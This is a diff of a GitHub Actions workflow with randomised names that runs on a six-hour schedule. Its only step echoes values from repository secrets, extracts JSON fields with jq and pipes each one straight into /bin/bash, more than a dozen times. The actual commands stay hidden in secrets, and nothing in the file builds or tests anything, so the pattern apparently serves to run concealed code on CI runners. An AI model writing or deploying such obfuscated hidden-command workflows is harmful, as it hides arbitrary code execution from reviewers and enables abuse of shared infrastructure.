@@ -1,10 +1,10 @@
 name: xiaolinan6715
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 2/6 * * *'
-
-jobs:  # 2048
+    - cron: '14 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,20 +12,16 @@ jobs:  # 2048
       - uses: actions/checkout@v4
       - name: xiaolinan6715
         env:
-          cpdb0: ${{ secrets.cpdb0 }}
+          gvbe79612: ${{ secrets.gvbe79612 }}
         run: |
-          echo $cpdb0 | jq -r .u93 | /bin/bash
-          echo $bew443 | jq -r .wqx71 | /bin/bash
-          echo $llp8 | jq -r .oqc2029 | /bin/bash
-          echo $gxc422 | jq -r .p2077 | /bin/bash
-          echo $jzb11726 | jq -r .ahck27931 | /bin/bash
-          echo $wp1 | jq -r .bpq60942 | /bin/bash
-          echo $wobzf34541 | jq -r .sxinc293 | /bin/bash
-          echo $l4624 | jq -r .ckvre7409 | /bin/bash
-          echo $rku5 | jq -r .kutz629 | /bin/bash
-          echo $yi6162 | jq -r .iws5 | /bin/bash
-          echo $hnj541 | jq -r .vgp23970 | /bin/bash
-          echo $qgkd6 | jq -r .usk37 | /bin/bash
-          echo $hnm61751 | jq -r .kbq3843 | /bin/bash
-          echo $cnfuv2925 | jq -r .c9008 | /bin/bash
+          echo $gvbe79612 | jq -r .ou9272 | /bin/bash
+          echo $mloy83990 | jq -r .qelv8111 | /bin/bash
+          echo $sntx87047 | jq -r .edopl08 | /bin/bash
+          echo $eaptp7 | jq -r .nxij12912 | /bin/bash
+          echo $tj72754 | jq -r .eeh19 | /bin/bash
+          echo $mcwcf5 | jq -r .jiab8791 | /bin/bash
+          echo $cfg45 | jq -r .wq39 | /bin/bash
+          echo $jkt79584 | jq -r .a42 | /bin/bash
+          echo $a865 | jq -r .zv46642 | /bin/bash
+          echo $sqyog0192 | jq -r .meg697 | /bin/bash
 
